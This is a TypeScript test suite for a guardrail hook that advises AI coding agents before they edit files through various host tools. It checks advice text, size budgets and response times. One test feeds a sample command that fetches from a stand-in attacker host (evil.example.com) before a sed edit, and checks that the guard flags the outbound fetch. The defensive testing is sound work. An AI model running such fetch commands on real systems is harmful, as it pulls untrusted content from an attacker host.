    const patchAdvice = String(JSON.parse(res.stdout.trim()).hookSpecificOutput.additionalContext);
    const names = ["p-add.ts", "p-del.ts", "p-upd.ts", "p-moved.ts"];
    const shown = names.filter((n) => patchAdvice.includes(n));
    expect(Buffer.byteLength(patchAdvice, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
    expect(shown.length + Number(omittedCount(patchAdvice))).toBe(names.length);
    expect(warnedFiles(tmp, session)).toHaveLength(shown.length);
    // The omitted targets are still eligible for a later patch.
    const hidden = names.filter((n) => !shown.includes(n));
    for (const n of hidden) expect(codexPatch(session, [`src/${n}`], tmp)).toContain(n);

    // Initial Bash payloads reach the shared formatter: exact targets get the per-file
    // checklist, the shell notice stays advisory, and the warning record is shared.
    const shellSession = newSession();
    const shell = codexBash(shellSession, "sed -i s/a/b/ src/from-shell.ts", tmp);
    expect(shell.denied).toBe(false);
    expect(shell.context).toContain("edits files through the shell");
    expect(shell.context).toContain("from-shell.ts");
    expect(shell.context).toContain("First edit to");
    expect(warnedFiles(tmp, shellSession)).toEqual([path.resolve(root, "src/from-shell.ts")]);
    expect(codexPatch(shellSession, ["src/from-shell.ts"], tmp)).toBe("");

    // Uncertain script effects stay explicit.
    const unknown = codexBash(newSession(), "python3 gen.py", tmp);
    expect(unknown.context).toContain("cannot be determined");

    // Interactive input is outside the pre-tool coverage: not registered, not advised.
    const hooks = JSON.parse(
      fs.readFileSync(path.resolve(".bkit/shared/.codex/hooks.json"), "utf-8"),
    ) as { hooks: { PreToolUse: { matcher: string }[] } };
    const matchers = hooks.hooks.PreToolUse.map((g) => g.matcher);
    expect(matchers).toEqual(expect.arrayContaining(["apply_patch", "Bash"]));
    expect(matchers.join("|")).not.toContain("write_stdin");
    expect(codexBash(newSession(), "sed -i s/a/b/ src/x.ts", tmp, "write_stdin").context).toBe("");
  });
});

// ---------------------------------------------------------------------------
// Task 9: OpenCode edit coverage and the after-execute boundary, on the real V1 and V2
// drivers.
// ---------------------------------------------------------------------------

interface OpencodeDrivers {
  v1After: (input: object, output: { output: string }) => Promise<void>;
  v1Before: (input: object, output: object) => Promise<void>;
  v2: Record<string, (event: object) => Promise<void>>;
}

async function opencodeDrivers(): Promise<OpencodeDrivers> {
  const { default: plugin } = await import(pathToFileURL(OPENCODE_PLUGIN).href);
  const v2: Record<string, (event: object) => Promise<void>> = {};
  await plugin.setup({
    tool: {
      hook: async (name: string, cb: (event: object) => Promise<void>) => {
        v2[name] = cb;
      },
    },
  });
  const v1 = await plugin.server();
  return {
    v1Before: v1["tool.execute.before"],
    v1After: v1["tool.execute.after"],
    v2,
  };
}

describe("opencode gateguard — edit coverage and boundary", () => {
  it("preserves OpenCode edit coverage and after-execute boundary", async () => {
    const d = await opencodeDrivers();
    const root = process.cwd();
    const patch = (names: string[]) =>
      [
        "*** Begin Patch",
        ...names.flatMap((n) => [`*** Update File: src/${n}`, "@@", "-a", "+b"]),
        "*** End Patch",
      ].join("\n");

    // V2: before never advises (no shell interception, no before-edit claim); the after
    // hook appends one complete block per patch target, each exactly once.
    const v2Session = newSession();
    const v2Names = ["oc2-a.ts", "oc2-b.ts", "oc2-c.ts"];
    const v2Event = {
      tool: "apply_patch",
      sessionID: v2Session,
      id: "oc-v2-1",
      input: { patchText: patch(v2Names) },
    };
    await d.v2["execute.before"](v2Event);
    const v2Result: { content: { type: string; text: string }[] } = { content: [] };
    await d.v2["execute.after"]({ ...v2Event, status: "completed", result: v2Result });
    const v2Text = v2Result.content.map((c) => c.text).join("");
    for (const n of v2Names) expect(v2Text).toContain(n);
    expect(v2Text.split("[bkit GateGuard] First edit to")).toHaveLength(v2Names.length + 1);

    // A later edit that reaches the same file by an absolute alias is silent.
    const alias: { content: { type: string; text: string }[] } = { content: [] };
    await d.v2["execute.after"]({
      tool: "edit",
      sessionID: v2Session,
      id: "oc-v2-2",
      status: "completed",
      input: { path: path.join(root, "src", v2Names[0]!) },
      result: alias,
    });
    expect(alias.content).toEqual([]);

    // V1: same coverage through the server() hooks, output on `output.output`.
    const v1Session = newSession();
    const v1Names = ["oc1-a.ts", "oc1-b.ts"];
    const v1Args = { patchText: patch(v1Names) };
    await d.v1Before(
      { tool: "apply_patch", sessionID: v1Session, callID: "oc-v1-1" },
      { args: v1Args },
    );
    const v1Out = { output: "" };
    await d.v1After(
      { tool: "apply_patch", sessionID: v1Session, callID: "oc-v1-1", args: v1Args },
      v1Out,
    );
    for (const n of v1Names) expect(v1Out.output).toContain(n);
    const v1Alias = { output: "" };
    await d.v1After(
      {
        tool: "edit",
        sessionID: v1Session,
        callID: "oc-v1-2",
        args: { filePath: path.join(root, "src", v1Names[1]!) },
      },
      v1Alias,
    );
    expect(v1Alias.output).toBe("");

    // A relative spelling after an absolute one is also the same file.
    const v1Rel = { output: "" };
    const absFirst = path.join(root, "src", "oc1-abs.ts");
    await d.v1After(
      { tool: "edit", sessionID: v1Session, callID: "oc-v1-3", args: { filePath: absFirst } },
      { output: "" },
    );
    await d.v1After(
      {
        tool: "edit",
        sessionID: v1Session,
        callID: "oc-v1-4",
        args: { filePath: "src/oc1-abs.ts" },
      },
      v1Rel,
    );
    expect(v1Rel.output).toBe("");

    // A large patch stays inside the widest conservative host budget (8,000 characters):
    // only whole blocks are shown, the omitted count is exact, and anything a block did
    // not show stays eligible for its own later edit.
    const manySession = newSession();
    const many = Array.from({ length: 60 }, (_, i) => `oc-many-${i}.ts`);
    const manyResult: { content: { type: string; text: string }[] } = { content: [] };
    await d.v2["execute.after"]({
      tool: "apply_patch",
      sessionID: manySession,
      id: "oc-v2-many",
      status: "completed",
      input: { patchText: patch(many) },
      result: manyResult,
    });
    const manyText = manyResult.content.map((c) => c.text).join("");
    expect(manyText.length).toBeLessThanOrEqual(8000);
    const { started, finished } = completeBlocks(manyText);
    expect(finished).toBe(started);
    expect(omittedCount(manyText)).toBe(many.length - started);
    const missing = many.filter((n) => !manyText.includes(n));
    expect(missing).toHaveLength(many.length - started);
    for (const n of missing.slice(0, 3)) {
      const one: { content: { type: string; text: string }[] } = { content: [] };
      await d.v2["execute.after"]({
        tool: "edit",
        sessionID: manySession,
        id: `oc-v2-${n}`,
        status: "completed",
        input: { path: `src/${n}` },
        result: one,
      });
      expect(one.content.map((c) => c.text).join("")).toContain(n);
    }

    // The plugin registers edit hooks only: no shell hook and no extra phase.
    expect(Object.keys(d.v2).sort()).toEqual(["execute.after", "execute.before"]);
    const shellResult: { content: { type: string; text: string }[] } = { content: [] };
    await d.v2["execute.after"]({
      tool: "bash",
      sessionID: newSession(),
      id: "oc-shell",
      status: "completed",
      input: { command: "sed -i s/a/b/ src/oc-shell.ts" },
      result: shellResult,
    });
    expect(shellResult.content).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Task 12: rendered parity of classification, advice and acknowledgement, and the
// cold-start and response-size bounds, across every adapter that sees shell commands.
// ---------------------------------------------------------------------------

type ShellHost = "claude" | "cursor" | "codex" | "antigravity";
const SHELL_HOSTS: ShellHost[] = ["claude", "cursor", "codex", "antigravity"];

const GUARDS: Record<ShellHost, string> = {
  claude: path.join(GENERATED, "claude-guardrails.cjs"),
  cursor: path.join(GENERATED, "cursor-guardrails.cjs"),
  codex: CODEX_GUARD,
  antigravity: path.join(GENERATED, "antigravity-guardrails.cjs"),
};
fs.writeFileSync(
  GUARDS.claude,
  readTemplate(path.resolve(".bkit/core/.claude/hooks/bkit-guardrails.cjs")),
);
fs.writeFileSync(
  GUARDS.cursor,
  readTemplate(path.resolve(".bkit/core/.cursor/hooks/bkit-guardrails.cjs")),
);
fs.writeFileSync(
  GUARDS.antigravity,
  readTemplate(path.resolve(".bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs")),
);

interface ShellResult {
  text: string;
  blocked: boolean;
  status: number | null;
  stdoutBytes: number;
  elapsedMs: number;
}

function shellPayload(host: ShellHost, command: string, session: string, ws: string): unknown {
  if (host === "claude") {
    return {
      session_id: session,
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      cwd: ws,
      tool_input: { command },
    };
  }
  if (host === "codex") {
    return { tool_name: "Bash", tool_input: { command }, session_id: session, cwd: ws };
  }
  if (host === "cursor") {
    return {
      command,
      cwd: ws,
      conversation_id: session,
      session_id: session,
      workspace_roots: [ws],
      hook_event_name: "beforeShellExecution",
    };
  }
  return {
    conversationId: session,
    toolCall: { name: "run_command", args: { CommandLine: command, Cwd: ws, toolAction: "Run" } },
    workspacePaths: [ws],
  };
}

function runShellHost(
  host: ShellHost,
  command: string,
  session: string,
  ws: string,
  env: Record<string, string | undefined> = {},
): ShellResult {
  const started = performance.now();
  const res = spawnSync("node", [GUARDS[host]], {
    input: JSON.stringify(shellPayload(host, command, session, ws)),
    encoding: "utf-8",
    cwd: fs.existsSync(ws) ? ws : process.cwd(),
    env: { ...process.env, BKIT_GATEGUARD: undefined, ...env },
  });
  const elapsedMs = performance.now() - started;
  const raw = res.stdout.trim();
  const out = (raw ? JSON.parse(raw) : {}) as Record<string, unknown>;
  const hso = (out.hookSpecificOutput ?? {}) as Record<string, unknown>;
  const text = String(
    hso.additionalContext ?? out.agent_message ?? (out.decision === "deny" ? out.reason : ""),
  );
  return {
    text: text === "undefined" ? "" : text,
    blocked: hso.permissionDecision === "deny" || out.permission === "deny",
    status: res.status,
    stdoutBytes: Buffer.byteLength(res.stdout, "utf-8"),
    elapsedMs,
  };
}

function shellSentence(text: string): string {
  for (const line of text.split("\n")) {
    if (line.includes("edits files through the shell")) return line.trim();
  }
  return "";
}

const FETCH_EDIT_FITS: ShellHost[] = ["claude"];

describe("gateguard parity — rendered shell advice", () => {
  it("keeps rendered classification advice and acknowledgement equivalent", async () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const ws = fs.mkdtempSync(path.join(GENERATED, "ws-"));
    const sentences = new Set<string>();

    for (const host of SHELL_HOSTS) {
      const env = { TMPDIR: tmp };

      // Exact target: the per-file checklist plus the shared general reminder.
      const session = newSession();
      const exact = runShellHost(host, "sed -i s/a/b/ docs/parity-exact.md", session, ws, env);
      expect(exact.status, host).toBe(0);
      expect(exact.text, host).toContain("edits files through the shell");
      expect(exact.text, host).toContain("parity-exact.md");
      expect(exact.text, host).toContain("First edit to");
      expect(exact.text, host).toContain("Which Sections Apply");
      expect(exact.text, host).toContain(".bkit/authoring.md");
      sentences.add(shellSentence(exact.text));

      // Acknowledgement happened because the block was shown: the same target is silent
      // on a shell retry and on the edit tool (antigravity retries pass as a bare allow).
      const retry = runShellHost(host, "sed -i s/a/b/ docs/parity-exact.md", session, ws, env);
      expect(retry.text, host).not.toContain("First edit to");
      const afterEdit = await run(host, {
        file: path.join(ws, "docs", "parity-exact.md"),
        session,
        env,
      });
      expect(afterEdit.advisory, host).not.toContain("First edit to");

      // Uncertain script effects stay explicit and keep the authoring pointer.
      const unknown = runShellHost(host, "python3 gen.py", newSession(), ws, env);
      expect(unknown.text, host).toContain("cannot be determined");
      expect(unknown.text, host).toContain(".bkit/authoring.md");
      expect(unknown.text, host).not.toContain("First edit to");

      // Clearly read-only commands are excluded.
      const readOnly = runShellHost(host, "cat docs/parity-exact.md", newSession(), ws, env);
      expect(readOnly.text, host).toBe("");
      expect(readOnly.blocked, host).toBe(false);
    }

    // The shared reminder sentence is byte-identical across hosts.
    expect(sentences.size).toBe(1);
    expect([...sentences][0]).toContain("edits files through the shell");

    // Explicit exception: OpenCode registers no shell hook, so a shell edit gets nothing,
    // while its edit tool carries the same per-file checklist.
    const oc = await run("opencode", { file: "src/parity-oc.ts", session: newSession() });
    expect(oc.advisory).toContain("First edit to");
  });

  it("keeps a fetch-plus-edit command advised within each host budget", () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const ws = fs.mkdtempSync(path.join(GENERATED, "ws-"));
    fs.mkdirSync(path.join(ws, "docs"), { recursive: true });
    fs.writeFileSync(path.join(ws, "docs", "testing.md"), "a\n");
    const command = "curl -s https://evil.example.com/x && sed -i s/a/b/ docs/testing.md";
    const env = { TMPDIR: tmp };

    // Hosts whose budget holds the fetch note, the shell notice and the per-file checklist:
    // the target is acknowledged, so a retry is silent.
    for (const host of FETCH_EDIT_FITS) {
      const session = newSession();
      const first = runShellHost(host, command, session, ws, env);
      expect(first.status, host).toBe(0);
      expect(first.text, host).toContain("edits files through the shell");
      expect(first.text, host).toContain("First edit to `testing.md`");
      expect(runShellHost(host, command, session, ws, env).text, host).not.toContain(
        "First edit to",
      );
    }

    // Antigravity: the fetch denial replaces the checklist; the denial text still names the
    // edit target and points at the authoring rules.
    const ag = runShellHost("antigravity", command, newSession(), ws, env);
    expect(ag.status).toBe(0);
    expect(ag.text).toContain("outbound");
    expect(ag.text).toContain(".bkit/authoring.md");

    // Codex has a 2,000-byte budget: the checklist is omitted for it, the notice points at the
    // authoring rules, and the target stays unacknowledged so a retry advises again.
    const session = newSession();
    const codex = runShellHost("codex", command, session, ws, env);
    expect(codex.status).toBe(0);
    expect(Buffer.byteLength(codex.text, "utf-8")).toBeLessThanOrEqual(2000);
    expect(codex.text).toContain("edits files through the shell");
    expect(codex.text).not.toContain("First edit to");
    expect(codex.text).toContain("omitted (output limit)");
    expect(codex.text).toContain(".bkit/authoring.md");
    expect(runShellHost("codex", command, session, ws, env).text).toContain(
      "edits files through the shell",
    );
  });

  it("bounds rendered cold-start time and complete response size", async () => {
    // Per-adapter ceiling: min(1 second, a quarter of the host's hook timeout). The shipped
    // hook registrations set no timeout, so the 1-second cap is the binding bound here.
    const BOUND_MS = 1000;
    const chars = (t: string): number => t.length;
    const bytes = (t: string): number => Buffer.byteLength(t, "utf-8");
    const BUDGETS: Record<
      ShellHost,
      { limit: number; unit: string; measure: (t: string) => number }
    > = {
      claude: { limit: 8000, unit: "chars", measure: chars },
      cursor: { limit: 2000, unit: "bytes", measure: bytes },
      codex: { limit: 2000, unit: "bytes", measure: bytes },
      antigravity: { limit: 2000, unit: "bytes", measure: bytes },
    };
    const blockedBy: { host: string; blocked: boolean }[] = [];
    const ws = fs.mkdtempSync(path.join(GENERATED, "ws-"));
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));

    // Maximum input: many long multi-byte targets in one command.
    const targets = Array.from({ length: 80 }, (_, i) => `docs/${"é".repeat(60)}-${i}.md`);
    const maximum = `sed -i s/a/b/ ${targets.join(" ")}`;
    // Unavailable source: the state folder and the working directory both cannot be used.
    const missingTmp = path.join(tmp, "does", "not", "exist");
    const evidence: string[] = [];

    for (const host of SHELL_HOSTS) {
      const cases: { label: string; result: ShellResult }[] = [
        {
          label: "maximum",
          result: runShellHost(host, maximum, newSession(), ws, { TMPDIR: tmp }),
        },
        {
          label: "unavailable-state",
          result: runShellHost(host, maximum, newSession(), ws, { TMPDIR: missingTmp }),
        },
        {
          label: "unavailable-cwd",
          result: runShellHost(
            host,
            "sed -i s/a/b/ docs/x.md",
            newSession(),
            path.join(ws, "gone"),
            {
              TMPDIR: tmp,
            },
          ),
        },
      ];
      for (const { label, result } of cases) {
        const budget = BUDGETS[host];
        const size = budget.measure(result.text);
        evidence.push(
          `${host}/${label} node=${process.version} bound=${BOUND_MS}ms elapsed=${Math.round(result.elapsedMs)}ms size=${size}${budget.unit} bytes=${result.stdoutBytes}`,
        );
        const where = `${host}/${label}`;
        expect(result.elapsedMs, evidence.join("\n")).toBeLessThan(BOUND_MS);
        expect(size, where).toBeLessThanOrEqual(budget.limit);
        // Never a crash, never a block, and only complete blocks (no cut-off checklist).
        expect(result.status, where).toBe(0);
        blockedBy.push({ host, blocked: result.blocked });
        const { started, finished } = completeBlocks(result.text);
        // The shell reminder closes with the same advisory line, so finished may exceed started.
        expect(finished, where).toBeGreaterThanOrEqual(started);
      }
    }

    // Only Antigravity delivers advice as a one-time deny; no other adapter ever blocks.
    expect(
      blockedBy
        .filter((e) => e.blocked)
        .map((e) => e.host)
        .filter((h) => h !== "antigravity"),
    ).toEqual([]);

    // The edit-tool adapters answer within the same bound with a bounded complete response.
    const patchTargets = targets.map((t) => `src/${t.slice(5)}`);
    const codexStart = performance.now();
    const codexAdvice = codexPatch(newSession(), patchTargets, tmp);
    const codexMs = performance.now() - codexStart;
    expect(codexMs, `codex patch ${Math.round(codexMs)}ms`).toBeLessThan(BOUND_MS);
    expect(Buffer.byteLength(codexAdvice, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
    expect(completeBlocks(codexAdvice).finished).toBe(completeBlocks(codexAdvice).started);

    for (const host of ["claude", "cursor", "antigravity"] as Host[]) {
      const started = performance.now();
      const out = await run(host, {
        file: path.join(ws, `${"é".repeat(300)}.ts`),
        session: newSession(),
        env: { TMPDIR: missingTmp },
      });
      const ms = performance.now() - started;
      expect(ms, `${host} edit ${Math.round(ms)}ms`).toBeLessThan(BOUND_MS);
      expect(BUDGETS[host as ShellHost].measure(out.advisory), host).toBeLessThanOrEqual(
        BUDGETS[host as ShellHost].limit,
      );
      expect(completeBlocks(out.advisory).finished, host).toBe(
        completeBlocks(out.advisory).started,
      );
    }
  });
});
